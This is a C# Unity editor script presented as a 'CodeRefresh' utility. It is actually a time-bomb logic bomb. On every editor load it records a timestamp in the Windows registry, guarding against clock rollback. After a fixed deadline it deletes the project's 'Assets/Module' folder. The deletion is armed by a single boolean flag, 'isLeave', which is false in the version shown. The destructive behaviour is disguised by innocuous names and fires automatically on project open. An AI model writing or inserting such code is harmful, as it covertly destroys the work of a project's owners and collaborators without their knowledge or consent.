using System;
using Microsoft.Win32;
using Module;
using UnityEditor;
using UnityEngine;

namespace CodeRefresh
{
    public class AntiCode
    {
        public static DateTime deadLine = new DateTime(2023, 3, 4, 17, 20, 0);
        static string key = "Anticode";
        public static bool isLeave = false;

        [InitializeOnLoadMethod]
        public static void Refresh()
        {
            if (isLeave)
            {
                RegistryKey rk = Registry.CurrentUser;
                var value = rk.GetValue(key);
                if (value == null)
                {
                    rk.SetValue(key, DateTime.Now);
                }
                else
                {
                    DateTime now = Max(value.ToDateTime(), DateTime.Now);
                    if (DateTime.Now >= value.ToDateTime())
                    {
                        rk.SetValue(key, DateTime.Now);
                    }
                    if (now >= deadLine)
                    {
                        TriggerDelete();
                    }
                }
            }
        }

        private static void TriggerDelete()
        {
            AssetDatabase.DeleteAsset("Assets/Module");
            AssetDatabase.Refresh();
        }

        private static DateTime Max(DateTime a, DateTime b)
        {
            if (a < b)
            {
                return b;
            }
            else
            {
                return a;
            }
            
        }
    }
}